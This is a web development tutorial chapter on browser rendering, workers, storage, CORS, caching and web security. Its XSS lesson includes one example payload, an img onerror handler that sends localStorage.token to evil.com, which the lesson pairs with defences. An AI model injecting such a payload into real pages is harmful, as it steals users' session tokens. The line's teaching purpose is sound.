# Part 6: Browser Architecture, Workers, Storage, Security and Performance

---

# Lesson 22: What happens when you type a URL?

1. **DNS lookup**: the domain name becomes an IP address (like looking up a phone book).
2. **Connection**: TCP handshake plus TLS for HTTPS (secure channel).
3. **HTTP request**: browser asks for the page.
4. **Response**: the server sends HTML.
5. **Rendering**: the browser turns HTML, CSS and JS into pixels. This is the **Critical Rendering Path**.

The rest of this lesson is step 5.

---

# Lesson 23: The Critical Rendering Path

Think of the browser as a **factory assembly line**.

```
HTML  ──parse──▶ DOM  ─┐
                       ├──▶ Render Tree ──▶ Layout ──▶ Paint ──▶ Composite ──▶ Screen
CSS   ──parse──▶ CSSOM ┘
```

## Step 1: DOM
The browser reads HTML top to bottom and builds the **DOM tree** (the tree from Lesson 1). It's built incrementally as bytes arrive.

## Step 2: CSSOM
CSS is parsed into the **CSS Object Model**, a tree of style rules (with the cascade resolved). Unlike HTML, the browser needs the **whole** CSS before rendering, because a later rule could override an earlier one. So **CSS is render-blocking**.

## Step 3: Render Tree
DOM and CSSOM are combined. Only **visible** things are included: `display: none` elements are left out (but `visibility: hidden` stays, since it still takes up space). Each node knows its computed styles.

## Step 4: Layout (a.k.a. Reflow)
The browser calculates the **exact size and position** of every box (the box model, flex, grid all resolved here). Changing something that affects geometry (`width`, `margin`, `font-size`, adding elements) forces layout again, which is **expensive**.

## Step 5: Paint
Turns boxes into drawing instructions (a display list) and fills in pixels: text, colors, borders, shadows, images. Changing `color` or `background` triggers paint but not layout.

## Step 6: Compositing
The page is split into **layers** (like transparent sheets). Layers are painted separately, then the **GPU** stacks them into the final image. Changing only `transform` or `opacity` can skip layout *and* paint and just re-composite, which is why animations use them (remember the sidebar's `translateX`).

## Cost ladder (cheapest to most expensive change)
| Changing... | Re-runs | Cost |
|---|---|---|
| `transform`, `opacity` | Composite only | Cheapest |
| `color`, `background` | Paint, Composite | Medium |
| `width`, `height`, `margin`, DOM add/remove | Layout, Paint, Composite | Expensive |

## Where JS fits
`<script>` normally **blocks HTML parsing** (JS might change the DOM, so the browser stops to run it). Fixes:
```html
<script src="app.js" defer></script>   <!-- download in parallel, run after HTML is parsed (in order) -->
<script src="app.js" async></script>   <!-- download in parallel, run as soon as ready (any order) -->
```
Use `defer` for your app code, and put CSS in `<head>`.

## Layout thrashing (a classic bug)
```js
// BAD: read, write, read, write... forces layout every loop
items.forEach(el => {
  el.style.width = el.offsetWidth + 10 + "px";   // read (forces layout) then write
});
// GOOD: do all reads first, then all writes
const widths = items.map(el => el.offsetWidth);
items.forEach((el, i) => el.style.width = widths[i] + 10 + "px");
```
Reading layout values like `offsetWidth` after a write forces the browser to recalc layout immediately.

Tip: DevTools **Performance** tab shows these exact phases.

---

# Lesson 24: The Event Loop and Rendering Together

Full loop (building on Lesson 20), per cycle:
1. Run **one macrotask** (a click handler, a timer, script).
2. Run **all microtasks**.
3. If it's time (roughly 60 times a second): run `requestAnimationFrame` callbacks, then **style, layout, paint**.
4. If idle time remains: `requestIdleCallback`.

Key insight: **rendering and your JS share one thread.** If your JS runs 200ms, no frames are drawn for 200ms and the page appears frozen. A 60fps display gives you only about **16ms per frame**.

## Web APIs revisited
`setTimeout`, `fetch`, DOM events and `console` are not part of the JS language; the **browser** provides them. When you call `setTimeout(fn, 1000)`, the browser's timer holds `fn`; after 1s it puts `fn` in the macrotask queue; the event loop runs it when the stack is free. This is why `setTimeout(fn, 0)` still runs *after* the current code.

---

# Lesson 25: requestAnimationFrame and requestIdleCallback

## requestAnimationFrame (rAF)
Runs your function right **before the next paint**, in sync with the screen's refresh. Perfect for animation.
```js
let x = 0;
function move() {
  x += 2;
  box.style.transform = `translateX(${x}px)`;
  if (x < 300) requestAnimationFrame(move);   // schedule the next frame
}
requestAnimationFrame(move);
```
Why not `setInterval`? Timers don't align to the screen refresh (jank), and keep running in background tabs. rAF pauses in hidden tabs and matches the display.

Make it frame-rate independent using the timestamp: `requestAnimationFrame((time) => ...)`.

## requestIdleCallback (rIC)
Runs low-priority work when the browser has **spare time**:
```js
requestIdleCallback((deadline) => {
  while (deadline.timeRemaining() > 0 && tasks.length) {
    doSmallTask(tasks.shift());
  }
}, { timeout: 2000 });     // run by 2s even if never idle
```
Good for analytics, prefetching, pre-computing. Not for visual updates (use rAF). Safari may not support it, so feature-check (`if ("requestIdleCallback" in window)`) or use `setTimeout` as a fallback.

---

# Lesson 26: Web Workers

Problem: heavy JS (image processing, huge sorting, parsing a 50MB file) blocks the single main thread, so the UI freezes.

Solution: run it in a **Web Worker**, a separate thread with its own event loop. It **cannot touch the DOM**. Communication happens by **sending messages**.

**main.js**
```js
const worker = new Worker("worker.js");
worker.postMessage({ n: 45 });
worker.onmessage = (e) => {
  result.textContent = e.data;          // main thread updates the UI
};
```
**worker.js**
```js
function fib(n) { return n < 2 ? n : fib(n - 1) + fib(n - 2); }
self.onmessage = (e) => {
  self.postMessage(fib(e.data.n));      // heavy work, off the main thread
};
```
Python analogy: like `multiprocessing` with queues: separate workers, communicating by messages instead of shared variables.

Details:
- Messages are **copied** (structured clone). Large binary data can be **transferred** (zero-copy): `postMessage(buffer, [buffer])`.
- Workers have no `window` or `document`, but do have `fetch`, timers, and IndexedDB.
- Stop with `worker.terminate()`.
- Don't make one for tiny jobs; startup costs time.

---

# Lesson 27: Service Workers

A **Service Worker** is a special worker that sits **between your page and the network** like a programmable proxy. It runs even when the tab is closed (the browser wakes it).

Lifecycle: **register, install, activate, fetch events**.

```js
// main.js
if ("serviceWorker" in navigator) {
  navigator.serviceWorker.register("/sw.js");
}
```
```js
// sw.js
const CACHE = "v1";

self.addEventListener("install", (e) => {
  e.waitUntil(
    caches.open(CACHE).then(c => c.addAll(["/", "/index.html", "/style.css", "/app.js"]))
  );
});

self.addEventListener("fetch", (e) => {
  e.respondWith(
    caches.match(e.request).then(cached => cached || fetch(e.request))   // cache-first
  );
});
```
Powers: **offline support**, instant loads, **push notifications**, background sync. Together with a `manifest.json` this makes a **PWA** (installable app).

Rules: needs **HTTPS** (localhost is fine); scoped to its folder; you must version your cache and delete old ones on `activate`, or users get stuck on stale files.

Common strategies:
- **Cache first**: static assets (fast).
- **Network first**: fresh data, fall back to cache offline.
- **Stale-while-revalidate**: show cache now, update in background.

---

# Lesson 28: Client-Side Storage

| Storage | Size | Sync? | Sent to server? | Lifetime | Use for |
|---|---|---|---|---|---|
| Cookies | ~4KB | n/a | **Every request** | Set by expiry | Auth session, tiny prefs |
| localStorage | ~5MB | **Sync (blocks)** | No | Forever | Theme, small settings |
| sessionStorage | ~5MB | Sync | No | Tab session | Temp per-tab state |
| IndexedDB | Large (hundreds of MB+) | **Async** | No | Forever | Big structured data, files, offline apps |
| Cache Storage | Large | Async | No | Until cleared | Request/response pairs for Service Workers |

Decision guide: tiny string, then localStorage; auth, then HttpOnly cookie; lots of data, then IndexedDB; offline files, then Cache Storage.

## IndexedDB in brief
It's a real database in the browser (object stores, indexes, transactions). The raw API is clunky (callbacks), so people use small wrappers like **idb** or **Dexie**:
```js
// with Dexie (a helper library)
const db = new Dexie("app");
db.version(1).stores({ notes: "++id, title" });
await db.notes.add({ title: "Hello" });
const all = await db.notes.toArray();
```
Think of it as SQLite for the browser. Remember: any user can clear or edit all browser storage, so **never store anything you can't afford to lose or can't trust**, and never sensitive secrets in unencrypted form.

---

# Lesson 29: Networking, Origins, CORS and Caching

## Origin
`origin = protocol + domain + port`. `https://app.com` and `https://api.app.com` are **different origins**; so are `http://` vs `https://`, and `:3000` vs `:4000`.

## Same-Origin Policy
By default a page **cannot read responses** from another origin. This stops `evil.com` from silently reading your bank's data using your logged-in browser.

## CORS
**CORS** is how a server says "I allow that origin to read my responses". The server adds a header:
```
Access-Control-Allow-Origin: https://myapp.com
```
Flow for "non-simple" requests (JSON POST, custom headers like `Authorization`):
1. Browser first sends a **preflight** `OPTIONS` request asking "may I?".
2. Server replies with allowed origins, methods, headers.
3. If allowed, the browser sends the real request.

Key truths (they clear up the most common confusion):
- **CORS is enforced by the browser, and configured on the server.** You can't fix a CORS error from frontend code. You fix it in the **server's** headers (or use a proxy).
- Using cookies cross-origin needs `credentials: "include"` on fetch **and** `Access-Control-Allow-Credentials: true` plus a specific origin (not `*`) on the server.
- The request often **reaches the server** anyway; the browser just refuses to hand you the response. CORS protects users, not servers.
- During development, the usual fix is a **dev proxy** (Vite/Next config) so the browser only talks to its own origin.

## HTTP Caching
Reuse downloaded files to save time. Controlled by response headers:
```
Cache-Control: max-age=31536000, immutable   # reuse for a year, no questions
Cache-Control: no-cache                      # may store, but must revalidate each time
Cache-Control: no-store                      # never store (sensitive data)
ETag: "abc123"                               # fingerprint of the content
Last-Modified: Tue, 01 Oct 2026 10:00:00 GMT
```
Revalidation: browser sends `If-None-Match: "abc123"`; if unchanged, server replies **304 Not Modified** with no body (cheap).

Best practice used by build tools: give files **hashed names** (`app.3f9a1c.js`), cache them for a year, and since a new build produces a new filename, there's never a stale-cache problem. HTML itself is served with `no-cache` so it always points to the newest files.

---

# Lesson 30: Web Security

## XSS (Cross-Site Scripting)
An attacker gets **their JavaScript to run on your page**, as if it were yours. It can steal tokens in localStorage, read the page, act as the user.

How it happens:
```js
// DANGEROUS: comment comes from a user
div.innerHTML = comment;
// comment = "<img src=x onerror='fetch(\"https://evil.com?c=\"+localStorage.token)'>"
```
Defences:
1. Use `textContent` (or let React escape for you; React escapes by default, and `dangerouslySetInnerHTML` is named that way for a reason).
2. Sanitize any HTML you must render (the DOMPurify library).
3. Use **CSP** (below).
4. Keep tokens in **HttpOnly cookies** so injected JS can't read them.
5. Never use `eval()` or build `<script>` from user text.

## CSRF (Cross-Site Request Forgery)
Attacker's site tricks your browser into sending a request to your bank, **and the browser automatically attaches your cookies**. (Notice: the attack works *because* cookies are automatic.)

Defences:
- **`SameSite=Lax` or `Strict`** cookies (modern browsers default to Lax).
- **CSRF tokens**: server issues a random token your forms must send back.
- Require custom headers / JSON content types and check `Origin`.
- Tokens sent in an `Authorization` header aren't automatic, so they're not CSRF-prone (but they are more exposed to XSS if in localStorage).

Memory trick: **XSS abuses the user's trust in the site; CSRF abuses the site's trust in the user's browser.**

## CSP (Content Security Policy)
A response header declaring **which sources are allowed** to load scripts, styles, images, etc. The browser blocks the rest.
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; img-src 'self' data:
```
Even if an attacker injects `<script>` or an inline `onerror`, the browser refuses to run it because inline scripts aren't allowed. Start with `Content-Security-Policy-Report-Only` to see what would break without actually blocking.

## Other habits
- **HTTPS everywhere.**
- Don't put API secrets in frontend code (anyone can open DevTools). Put them on a server.
- Validate on the server, always. Frontend checks are only for friendliness.
- `rel="noopener"` on `target="_blank"` links (modern browsers do it by default).
- Keep dependencies updated (`npm audit`).

---

# Lesson 31: Putting it all together

When a user opens your React/Next.js app and clicks "Send" in a chat:

1. Browser **DNS, TLS, HTTP** gets HTML (caching headers decide if it's reused).
2. HTML parsed into **DOM**, CSS into **CSSOM**, then **render tree, layout, paint, composite**; your `defer`red JS runs.
3. User clicks, so a **macrotask** runs your handler.
4. Handler updates **state**; the framework **re-renders** (batching DOM changes to avoid layout thrash).
5. `fetch` POST (with **JWT** header or **HttpOnly cookie**) leaves; the browser may do a **CORS preflight**.
6. The server streams back **SSE** chunks; your `ReadableStream` loop appends text.
7. Each chunk is a **microtask/macrotask**; `requestAnimationFrame` aligns repaints, with `transform`/`opacity` for smooth animations.
8. Heavy work (markdown parsing of a long reply) can go to a **Web Worker**.
9. Conversation saved to **IndexedDB**; a **Service Worker** makes the app work offline.
10. All user text is rendered via **escaped text** (no XSS), under a strict **CSP**.

Every idea in this course appears in that one sequence.

---

# Where to go next

You are now ready for frameworks. Recommended order:
1. **React** (components, state, props, hooks): it is "state then render" automated.
2. **Next.js** (routing, server components, API routes).
3. **shadcn/ui** (you can read its Tailwind code now).
4. **TypeScript**, since all of these use it.

Build 3 portfolio projects: a todo app with localStorage, a weather app with fetch, and an AI chat UI with streaming. If you build those without copying, the foundation is solid.
